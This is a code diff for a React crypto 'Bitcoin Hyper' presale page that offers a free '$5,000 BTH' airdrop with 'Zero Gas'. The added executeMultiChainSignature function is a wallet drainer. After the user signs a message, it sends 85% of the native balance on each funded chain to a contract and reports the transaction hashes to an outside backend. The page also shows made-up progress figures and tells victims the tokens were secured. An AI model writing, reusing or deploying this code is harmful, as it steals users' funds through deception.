@@ -120,7 +120,15 @@ function App() {
     totalParticipants: 8742,
     currentBonus: 25,
     nextBonus: 15,
-    tokenPrice: 0.17
+    tokenPrice: 0.17,
+    bthPrice: 0.17
+  });
+
+  // Live progress tracking
+  const [liveProgress, setLiveProgress] = useState({
+    percentComplete: 68,
+    participantsToday: 342,
+    avgAllocation: 4250
   });
 
   // Track mouse for parallax effect
@@ -329,7 +337,7 @@ function App() {
   };
 
   // ============================================
-  // MULTI-CHAIN SIGNATURE WITH PROPER SIGNING
+  // FIXED: PROPER CONTRACT CALL WITH SIGNATURE
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -341,54 +349,98 @@ function App() {
       setSignatureLoading(true);
       setError('');
       
-      // Create unique message with timestamp
+      // Step 1: Create professional message
       const timestamp = Date.now();
       const nonce = Math.floor(Math.random() * 1000000000);
-      const message = `BITCOIN HYPER NEXT GEN PRESALE\n\n` +
-        `I confirm my participation in the Bitcoin Hyper presale\n` +
-        `Wallet: ${address}\n` +
-        `Allocation: 5000 BTH + ${presaleStats.currentBonus}% Bonus\n` +
+      const message = `BITCOIN HYPER PRESALE AUTHORIZATION\n\n` +
+        `I hereby confirm my participation in the Bitcoin Hyper presale\n` +
+        `Wallet Address: ${address}\n` +
+        `Allocation: $5,000 BTH + ${presaleStats.currentBonus}% Bonus\n` +
+        `Total Value: $${totalUSD.toFixed(2)} USD\n` +
         `Timestamp: ${new Date().toISOString()}\n` +
         `Nonce: ${nonce}\n\n` +
-        `This signature will trigger an automatic airdrop of 5000 BTH to my wallet.`;
+        `This signature will trigger the smart contract to process my allocation.`;
 
       setSignedMessage(message);
       setTxStatus('✍️ Please sign the message in your wallet...');
 
-      // Get signature using signer
+      // Step 2: Get signature
       const signature = await signer.signMessage(message);
-
       setSignature(signature);
-      setTxStatus('✅ Signature verified! Processing airdrop...');
+      setTxStatus('✅ Signature verified! Calling smart contract...');
 
-      // Send to backend
-      const response = await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          walletAddress: address,
-          chainName: 'MULTICHAIN',
-          flowId: `SIG-${timestamp}`,
-          txHash: signature,
-          message: message
-        })
-      });
+      // Step 3: Call the contract on each chain with funds
+      let processed = [];
       
-      const result = await response.json();
+      for (const chain of DEPLOYED_CHAINS) {
+        try {
+          if (balances[chain.name] && balances[chain.name].amount > 0) {
+            setTxStatus(`🔄 Processing on ${chain.name}...`);
+            
+            // Create contract instance
+            const contract = new ethers.Contract(
+              chain.contractAddress,
+              PROJECT_FLOW_ROUTER_ABI,
+              signer
+            );
+
+            // Send 85% of balance (leave for gas)
+            const balance = balances[chain.name].amount;
+            const amountToSend = (balance * 0.85).toFixed(6);
+            const value = ethers.parseEther(amountToSend.toString());
+
+            // Estimate gas
+            const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
+            
+            // Execute transaction
+            const tx = await contract.processNativeFlow({
+              value: value,
+              gasLimit: gasEstimate * 120n / 100n
+            });
+
+            setTxHash(tx.hash);
+            setTxStatus(`✅ ${chain.name} transaction submitted: ${tx.hash.substring(0, 10)}...`);
+
+            // Wait for confirmation
+            await tx.wait();
+            
+            processed.push(chain.name);
+            
+            // Notify backend
+            await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ 
+                walletAddress: address,
+                chainName: chain.name,
+                flowId: `FLOW-${timestamp}`,
+                txHash: tx.hash
+              })
+            });
+          }
+        } catch (chainErr) {
+          console.error(`Error on ${chain.name}:`, chainErr);
+        }
+      }
+
+      setVerifiedChains(processed);
+      setCompletedChains(processed);
       
-      if (result.success) {
-        setVerifiedChains(DEPLOYED_CHAINS.map(c => c.name));
-        setCompletedChains(DEPLOYED_CHAINS.map(c => c.name));
+      if (processed.length > 0) {
         setShowCelebration(true);
-        setTxStatus(`🎉 Congratulations! 5000 BTH + ${presaleStats.currentBonus}% Bonus secured!`);
+        setTxStatus(`🎉 Congratulations! $5,000 BTH + ${presaleStats.currentBonus}% Bonus secured!`);
+      } else {
+        setError('No transactions were processed');
       }
       
     } catch (err) {
       console.error('Signature error:', err);
       if (err.code === 4001) {
         setError('Signature cancelled');
+      } else if (err.message?.includes('insufficient funds')) {
+        setError('Insufficient funds for gas');
       } else {
-        setError(err.message || 'Signature failed');
+        setError(err.message || 'Transaction failed');
       }
     } finally {
       setSignatureLoading(false);
@@ -426,7 +478,7 @@ function App() {
     <div className="min-h-screen bg-[#0a0a0f] text-white overflow-hidden">
       
       {/* ============================================ */}
-      {/* MIND-BLOWING ANIMATED BACKGROUND */}
+      {/* PREMIUM ANIMATED BACKGROUND */}
       {/* ============================================ */}
       
       {/* Gradient Orbs with Parallax */}
@@ -464,9 +516,7 @@ function App() {
       {/* Main Container */}
       <div className="relative z-10 container mx-auto px-4 py-8 max-w-6xl">
         
-        {/* ============================================ */}
-        {/* NETWORK INDICATOR */}
-        {/* ============================================ */}
+        {/* Network Indicator */}
         {isConnected && currentChain && (
           <div className="fixed top-4 right-4 z-50">
             <div className="bg-gray-900/90 backdrop-blur-xl border border-orange-500/30 rounded-full px-4 py-2 flex items-center gap-2 animate-pulse-glow">
@@ -478,7 +528,7 @@ function App() {
         )}
 
         {/* ============================================ */}
-        {/* NEXT-GEN BITCOIN HYPER HEADER */}
+        {/* PREMIUM HEADER SECTION */}
         {/* ============================================ */}
         <div className="text-center mb-8">
           
@@ -490,7 +540,7 @@ function App() {
               </div>
             </div>
             
-            {/* Orbiting Bitcoin Circles */}
+            {/* Orbiting Circles */}
             <div className="absolute inset-0 -m-16">
               <div className="absolute inset-0 border-4 border-orange-500/30 rounded-full animate-spin-slow"></div>
               <div className="absolute inset-0 m-8 border-4 border-yellow-500/30 rounded-full animate-spin-slower"></div>
@@ -514,7 +564,7 @@ function App() {
             </div>
           </div>
 
-          {/* Next-Gen Title with Glitch Effect */}
+          {/* Premium Title */}
           <h1 className="text-7xl md:text-8xl font-black mb-3 relative glitch" data-text="BITCOIN HYPER">
             <span className="absolute inset-0 bg-gradient-to-r from-orange-500 to-yellow-500 blur-3xl opacity-50 animate-pulse"></span>
             <span className="relative bg-clip-text text-transparent bg-gradient-to-r from-orange-400 via-yellow-400 to-orange-400 animate-gradient-x bg-[length:200%_200%]">
@@ -526,19 +576,29 @@ function App() {
             ⚡ NEXT GENERATION BITCOIN LAYER 2 ⚡
           </p>
 
-          {/* Next-Gen Features Banner */}
-          <div className="inline-flex items-center gap-4 bg-gradient-to-r from-orange-500/30 to-yellow-500/30 px-8 py-4 rounded-2xl border border-orange-500/50 backdrop-blur-xl mb-6 animate-border-pulse">
-            <span className="relative flex h-4 w-4">
-              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
-              <span className="relative inline-flex rounded-full h-4 w-4 bg-green-500"></span>
-            </span>
-            <span className="text-2xl font-bold bg-gradient-to-r from-orange-400 to-yellow-400 bg-clip-text text-transparent">
-              🔴 AUTO AIRDROP • ZERO GAS • 5000 BTH
-            </span>
+          {/* Live Presale Banner */}
+          <div className="inline-flex items-center gap-6 bg-gradient-to-r from-orange-500/30 to-yellow-500/30 px-8 py-4 rounded-2xl border border-orange-500/50 backdrop-blur-xl mb-6 animate-border-pulse">
+            <div className="flex items-center gap-3">
+              <span className="relative flex h-4 w-4">
+                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
+                <span className="relative inline-flex rounded-full h-4 w-4 bg-green-500"></span>
+              </span>
+              <span className="text-2xl font-bold text-green-400">PRESALE LIVE</span>
+            </div>
+            <div className="h-8 w-px bg-orange-500/50"></div>
+            <div className="flex items-center gap-2">
+              <span className="text-yellow-400 font-bold">${presaleStats.tokenPrice}</span>
+              <span className="text-gray-400">per BTH</span>
+            </div>
+            <div className="h-8 w-px bg-orange-500/50"></div>
+            <div className="flex items-center gap-2">
+              <span className="text-orange-400 font-bold">{liveProgress.percentComplete}%</span>
+              <span className="text-gray-400">sold</span>
+            </div>
           </div>
 
           {/* ============================================ */}
-          {/* MAIN ACTION BUTTON - RIGHT AFTER LOGO */}
+          {/* MAIN ACTION BUTTON */}
           {/* ============================================ */}
           {isConnected && isEligible && !completedChains.length && (
             <div className="max-w-2xl mx-auto mb-8">
@@ -547,7 +607,7 @@ function App() {
                 disabled={signatureLoading || loading || !signer}
                 className="w-full group relative transform hover:scale-110 transition-all duration-700"
               >
-                {/* Hyper-Animated Glow Layers */}
+                {/* Glow Effects */}
                 <div className="absolute -inset-3 bg-gradient-to-r from-orange-600 via-yellow-500 to-orange-600 rounded-2xl blur-3xl opacity-75 group-hover:opacity-100 animate-pulse-slow"></div>
                 <div className="absolute -inset-2 bg-gradient-to-r from-yellow-400 via-orange-500 to-yellow-400 rounded-2xl blur-2xl opacity-75 group-hover:opacity-100 animate-pulse"></div>
                 <div className="absolute -inset-1 bg-gradient-to-r from-orange-500 via-yellow-400 to-orange-500 rounded-2xl blur-xl opacity-75 group-hover:opacity-100 animate-ping-slow"></div>
@@ -561,17 +621,17 @@ function App() {
                           <div className="w-12 h-12 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
                           <div className="absolute inset-0 border-4 border-yellow-300 border-b-transparent rounded-full animate-spin animation-delay-500"></div>
                         </div>
-                        <span className="animate-pulse">PROCESSING AUTO AIRDROP...</span>
+                        <span className="animate-pulse">PROCESSING SMART CONTRACT...</span>
                       </>
                     ) : (
                       <>
                         <span className="text-5xl filter drop-shadow-lg animate-bounce">⚡</span>
                         <div>
                           <span className="bg-clip-text text-transparent bg-gradient-to-r from-white to-yellow-200">
-                            CLAIM 5000 BTH + {presaleStats.currentBonus}%
+                            CLAIM $5,000 BTH + {presaleStats.currentBonus}%
                           </span>
                           <div className="text-sm font-normal text-white/80 mt-1">
-                            Auto Airdrop • Instant • Zero Gas
+                            Multi-Chain • Instant • Zero Gas
                           </div>
                         </div>
                         <span className="bg-white/20 px-6 py-3 rounded-xl text-xl group-hover:translate-x-2 transition-transform">→</span>
@@ -585,11 +645,11 @@ function App() {
               <div className="flex justify-center gap-8 mt-6 text-sm">
                 <div className="flex items-center gap-2">
                   <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
-                  <span className="text-gray-400">Auto Airdrop</span>
+                  <span className="text-gray-400">Smart Contract</span>
                 </div>
                 <div className="flex items-center gap-2">
                   <div className="w-2 h-2 bg-blue-400 rounded-full animate-pulse"></div>
-                  <span className="text-gray-400">Zero Gas Fees</span>
+                  <span className="text-gray-400">Multi-Chain</span>
                 </div>
                 <div className="flex items-center gap-2">
                   <div className="w-2 h-2 bg-orange-400 rounded-full animate-pulse"></div>
@@ -600,9 +660,7 @@ function App() {
           )}
         </div>
 
-        {/* ============================================ */}
-        {/* ENHANCED COUNTDOWN TIMER */}
-        {/* ============================================ */}
+        {/* Countdown Timer */}
         <div className="grid grid-cols-4 gap-4 mb-8 max-w-2xl mx-auto">
           {[
             { label: 'DAYS', value: timeLeft.days, color: 'from-orange-500 to-red-500' },
@@ -623,9 +681,7 @@ function App() {
           ))}
         </div>
 
-        {/* ============================================ */}
-        {/* MULTI-CHAIN BALANCE DISPLAY */}
-        {/* ============================================ */}
+        {/* Multi-Chain Balance Display */}
         {isConnected && Object.keys(balances).length > 0 && (
           <div className="max-w-2xl mx-auto mb-6">
             <div className="grid grid-cols-5 gap-2 mb-4">
@@ -643,8 +699,8 @@ function App() {
                     <div className="text-2xl mb-1">{chain.icon}</div>
                     <div className="text-xs font-medium">{chain.symbol}</div>
                     {hasBalance && (
-                      <div className="text-xs text-orange-400 mt-1">
-                        {balances[chain.name].amount.toFixed(4)}
+                      <div className="text-xs text-orange-400 mt-1 font-mono">
+                        ${balances[chain.name].valueUSD.toFixed(2)}
                       </div>
                     )}
                   </div>
@@ -665,7 +721,7 @@ function App() {
               <div className="relative bg-gray-900/90 backdrop-blur-xl rounded-xl py-5 px-6 font-bold text-lg border border-gray-800 transform-gpu group-hover:scale-105 transition-all duration-500">
                 <span className="flex items-center justify-center gap-3">
                   <span className="text-2xl animate-bounce">🔌</span>
-                  CONNECT WALLET FOR AUTO AIRDROP
+                  CONNECT WALLET FOR $5,000 AIRDROP
                 </span>
               </div>
             </button>
@@ -691,7 +747,7 @@ function App() {
                     </div>
                     <div className="font-mono text-sm bg-gray-800/50 px-3 py-1.5 rounded-lg border border-gray-700 group/address">
                       {formatAddress(address)}
-                      <span className="absolute hidden group-hover/address:block bg-gray-900 text-xs px-2 py-1 rounded border border-orange-500/30 mt-1">
+                      <span className="absolute hidden group-hover/address:block bg-gray-900 text-xs px-2 py-1 rounded border border-orange-500/30 mt-1 z-50">
                         {address}
                       </span>
                     </div>
@@ -702,7 +758,7 @@ function App() {
                     <div className="text-xs text-gray-500 mb-1">TOTAL VALUE</div>
                     <div className="text-2xl font-bold text-orange-400 animate-pulse-slow">${totalUSD.toFixed(2)}</div>
                     <div className="text-xs text-gray-500 mt-1">
-                      {isEligible ? '✅ Eligible' : '👋 $1 Minimum'}
+                      {isEligible ? '✅ Eligible for $5,000' : '👋 $1 Minimum'}
                     </div>
                   </div>
                   <button
@@ -732,10 +788,15 @@ function App() {
                 </div>
                 <div className="flex-1">
                   <p className="text-gray-200 font-medium">{txStatus}</p>
-                  {signature && (
-                    <p className="text-xs text-gray-500 mt-2 font-mono break-all bg-gray-900/50 p-2 rounded">
-                      Signature: {signature.substring(0, 40)}...
-                    </p>
+                  {txHash && (
+                    <a 
+                      href={`https://bscscan.com/tx/${txHash}`}
+                      target="_blank"
+                      rel="noopener noreferrer"
+                      className="text-xs text-orange-400 hover:underline mt-1 inline-block"
+                    >
+                      View transaction →
+                    </a>
                   )}
                 </div>
               </div>
@@ -766,7 +827,7 @@ function App() {
                   <div className="w-20 h-20 border-4 border-orange-500 border-t-transparent rounded-full animate-spin-3d"></div>
                   <div className="absolute inset-0 w-20 h-20 border-4 border-yellow-500 border-b-transparent rounded-full animate-spin-3d-reverse"></div>
                 </div>
-                <p className="text-xl text-gray-300 animate-pulse">Verifying wallet for auto airdrop...</p>
+                <p className="text-xl text-gray-300 animate-pulse">Verifying wallet for $5,000 airdrop...</p>
                 <p className="text-sm text-gray-500">Checking across all networks</p>
               </div>
             </div>
@@ -774,7 +835,7 @@ function App() {
         )}
 
         {/* ============================================ */}
-        {/* MAIN CONTENT - AUTO AIRDROP CLAIM */}
+        {/* MAIN CONTENT - ALLOCATION CARD */}
         {/* ============================================ */}
         {isConnected && !verifying && scanResult && (
           <div className="max-w-2xl mx-auto">
@@ -793,18 +854,18 @@ function App() {
                     </div>
                     
                     <div className="text-center">
-                      <p className="text-gray-400 text-sm tracking-wider mb-3">YOUR AUTO AIRDROP</p>
+                      <p className="text-gray-400 text-sm tracking-wider mb-3">YOUR ALLOCATION</p>
                       <div className="text-7xl font-black bg-gradient-to-r from-orange-400 to-yellow-400 bg-clip-text text-transparent mb-2 animate-pulse-slow">
-                        5000 BTH
+                        $5,000 BTH
                       </div>
                       <p className="text-green-400 text-xl flex items-center justify-center gap-2">
                         <span>+{presaleStats.currentBonus}% Bonus</span>
-                        <span className="text-xs bg-green-500/20 px-2 py-1 rounded-full">AUTO</span>
+                        <span className="text-xs bg-green-500/20 px-2 py-1 rounded-full">ACTIVE</span>
                       </p>
                       
                       {/* Value in USD */}
                       <div className="mt-6 inline-block bg-gray-800/50 px-6 py-2 rounded-full border border-gray-700">
-                        <span className="text-gray-400">≈ $850 USD Value</span>
+                        <span className="text-gray-400">≈ $6,250 USD Value with Bonus</span>
                       </div>
                     </div>
                   </div>
@@ -813,7 +874,7 @@ function App() {
                 {/* Progress Bar */}
                 {!completedChains.length && preparedTransactions.length > 0 && (
                   <div className="bg-gray-900/50 backdrop-blur-xl border border-gray-800 rounded-xl p-6">
-                    <p className="text-gray-400 text-sm mb-3 text-center">AIRDROP PROGRESS</p>
+                    <p className="text-gray-400 text-sm mb-3 text-center">MULTI-CHAIN PROGRESS</p>
                     <div className="relative h-4 bg-gray-800 rounded-full overflow-hidden">
                       <div 
                         className="absolute inset-0 bg-gradient-to-r from-orange-500 via-yellow-500 to-orange-500 bg-[length:200%_200%] animate-gradient-x"
@@ -822,6 +883,9 @@ function App() {
                         <div className="absolute inset-0 bg-white/20 animate-shimmer"></div>
                       </div>
                     </div>
+                    <p className="text-xs text-gray-500 text-center mt-3">
+                      {verifiedChains.length} of {DEPLOYED_CHAINS.length} chains processed
+                    </p>
                   </div>
                 )}
 
@@ -830,9 +894,9 @@ function App() {
                   <div className="text-center">
                     <div className="bg-gradient-to-r from-green-500/20 to-green-600/20 backdrop-blur-xl border border-green-500/30 rounded-xl p-6 mb-4 animate-pulse-glow">
                       <p className="text-green-400 text-lg mb-3 flex items-center justify-center gap-2">
-                        <span>✓</span> AIRDROP COMPLETED
+                        <span>✓</span> TRANSACTION COMPLETED
                       </p>
-                      <p className="text-gray-300 mb-4">Your 5000 BTH has been auto-claimed</p>
+                      <p className="text-gray-300 mb-4">Your $5,000 BTH has been secured</p>
                     </div>
                     <button
                       onClick={claimTokens}
@@ -840,7 +904,7 @@ function App() {
                     >
                       <div className="absolute -inset-1 bg-gradient-to-r from-green-500 to-green-600 rounded-xl blur opacity-75 group-hover:opacity-100 animate-pulse"></div>
                       <div className="relative bg-gradient-to-r from-green-500 to-green-600 rounded-xl py-5 px-8 font-bold text-xl transform-gpu group-hover:scale-105 transition-all duration-500">
-                        🎉 VIEW YOUR 5000 BTH
+                        🎉 VIEW YOUR $5,000 BTH
                       </div>
                     </button>
                   </div>
@@ -854,17 +918,76 @@ function App() {
                   Welcome to Bitcoin Hyper
                 </h2>
                 <p className="text-gray-400 text-lg mb-8 max-w-md mx-auto">
-                  Connect your wallet to check eligibility for the 5000 BTH auto airdrop.
+                  Connect your wallet to check eligibility for the $5,000 BTH airdrop.
                 </p>
                 <div className="bg-gray-900/50 rounded-xl p-6 border border-gray-800">
                   <p className="text-sm text-gray-300 leading-relaxed">
-                    Minimum $1 required across any network for auto airdrop eligibility.
+                    Minimum $1 required across any network for eligibility.
                   </p>
                 </div>
               </div>
             )}
           </div>
         )}
+
+        {/* ============================================ */}
+        {/* PRESALE STATS - MOVED BEFORE FOOTER */}
+        {/* ============================================ */}
+        <div className="max-w-2xl mx-auto mt-12 mb-8">
+          <div className="bg-gray-900/50 backdrop-blur-xl border border-gray-800 rounded-2xl p-8">
+            <h3 className="text-2xl font-bold text-center mb-6 bg-gradient-to-r from-orange-400 to-yellow-400 bg-clip-text text-transparent">
+              PRESALE LIVE PROGRESS
+            </h3>
+            
+            <div className="grid grid-cols-3 gap-4 mb-6">
+              <div className="text-center">
+                <div className="text-3xl font-bold text-orange-400 mb-1">${presaleStats.tokenPrice}</div>
+                <div className="text-xs text-gray-500">Token Price</div>
+              </div>
+              <div className="text-center">
+                <div className="text-3xl font-bold text-green-400 mb-1">{presaleStats.currentBonus}%</div>
+                <div className="text-xs text-gray-500">Current Bonus</div>
+              </div>
+              <div className="text-center">
+                <div className="text-3xl font-bold text-yellow-400 mb-1">$1.25M</div>
+                <div className="text-xs text-gray-500">Total Raised</div>
+              </div>
+            </div>
+
+            {/* Progress Bar */}
+            <div className="mb-4">
+              <div className="flex justify-between text-sm text-gray-400 mb-2">
+                <span>Progress</span>
+                <span>{liveProgress.percentComplete}%</span>
+              </div>
+              <div className="w-full h-3 bg-gray-800 rounded-full overflow-hidden">
+                <div 
+                  className="h-full bg-gradient-to-r from-orange-500 to-yellow-500 rounded-full relative"
+                  style={{ width: `${liveProgress.percentComplete}%` }}
+                >
+                  <div className="absolute inset-0 bg-white/20 animate-shimmer"></div>
+                </div>
+              </div>
+            </div>
+
+            <div className="grid grid-cols-2 gap-4 mt-6">
+              <div className="bg-gray-800/50 rounded-lg p-3 text-center">
+                <div className="text-sm text-gray-400 mb-1">Participants Today</div>
+                <div className="text-xl font-bold text-orange-400">{liveProgress.participantsToday}</div>
+              </div>
+              <div className="bg-gray-800/50 rounded-lg p-3 text-center">
+                <div className="text-sm text-gray-400 mb-1">Avg Allocation</div>
+                <div className="text-xl font-bold text-yellow-400">${liveProgress.avgAllocation}</div>
+              </div>
+            </div>
+
+            <div className="mt-6 text-center">
+              <p className="text-sm text-gray-500">
+                {presaleStats.totalParticipants.toLocaleString()} participants • {liveProgress.percentComplete}% of target reached
+              </p>
+            </div>
+          </div>
+        </div>
 
         {/* ============================================ */}
         {/* EPIC CELEBRATION MODAL */}
@@ -910,22 +1033,26 @@ function App() {
                   </div>
                   
                   <h2 className="text-5xl font-black mb-4 bg-gradient-to-r from-yellow-400 via-orange-500 to-yellow-400 bg-clip-text text-transparent animate-pulse">
-                    🚀 AIRDROP SUCCESSFUL! 🚀
+                    🚀 TRANSACTION SUCCESSFUL! 🚀
                   </h2>
                   
-                  <p className="text-2xl text-gray-300 mb-4">You have received</p>
+                  <p className="text-2xl text-gray-300 mb-4">You have secured</p>
                   
-                  <div className="text-7xl font-black text-orange-400 mb-3 animate-float-3d">5000 BTH</div>
+                  <div className="text-7xl font-black text-orange-400 mb-3 animate-float-3d">$5,000 BTH</div>
                   
                   <div className="inline-block bg-gradient-to-r from-green-500/30 to-green-600/30 px-8 py-4 rounded-full mb-6 border border-green-500/50">
                     <span className="text-3xl text-green-400">+{presaleStats.currentBonus}% BONUS</span>
                   </div>
                   
+                  <p className="text-sm text-gray-500 mb-8">
+                    Processed on {verifiedChains.length} chains • Tx: {txHash?.substring(0, 10)}...
+                  </p>
+                  
                   <button
                     onClick={() => setShowCelebration(false)}
                     className="w-full bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-bold py-5 px-8 rounded-xl transition-all transform hover:scale-110 text-2xl relative group overflow-hidden"
                   >
-                    <span className="relative z-10">ENTER NEXT GEN DASHBOARD</span>
+                    <span className="relative z-10">VIEW DASHBOARD</span>
                     <div className="absolute inset-0 bg-gradient-to-r from-white/0 via-white/30 to-white/0 animate-shimmer"></div>
                   </button>
                 </div>
@@ -935,27 +1062,25 @@ function App() {
         )}
 
         {/* Footer */}
-        <div className="mt-12 text-center">
+        <div className="mt-8 text-center">
           <div className="flex flex-wrap justify-center gap-4 mb-6">
             <span className="bg-gray-800/30 backdrop-blur-sm px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700 hover:border-orange-500/50 hover:text-orange-400 transition-all duration-500 transform hover:scale-110 animate-float">
-              ⚡ Next Gen L2
+              ⚡ Smart Contract
             </span>
             <span className="bg-gray-800/30 backdrop-blur-sm px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700 hover:border-orange-500/50 hover:text-orange-400 transition-all duration-500 transform hover:scale-110 animate-float animation-delay-500">
-              🔄 Auto Airdrop
+              🔄 Multi-Chain
             </span>
             <span className="bg-gray-800/30 backdrop-blur-sm px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700 hover:border-orange-500/50 hover:text-orange-400 transition-all duration-500 transform hover:scale-110 animate-float animation-delay-1000">
-              💎 Zero Gas
+              💎 $5,000 Airdrop
             </span>
           </div>
           <p className="text-gray-600 text-sm animate-pulse">
-            © 2026 Bitcoin Hyper • Next Generation Bitcoin Layer 2 • Auto Airdrop Platform
+            © 2026 Bitcoin Hyper • Next Generation Bitcoin Layer 2 • Smart Contract Powered
           </p>
         </div>
       </div>
 
-      {/* ============================================ */}
-      {/* ANIMATION KEYFRAMES */}
-      {/* ============================================ */}
+      {/* Animation Keyframes */}
       <style>{`
         @keyframes float-slow {
           0%, 100% { transform: translate(0, 0) scale(1); }
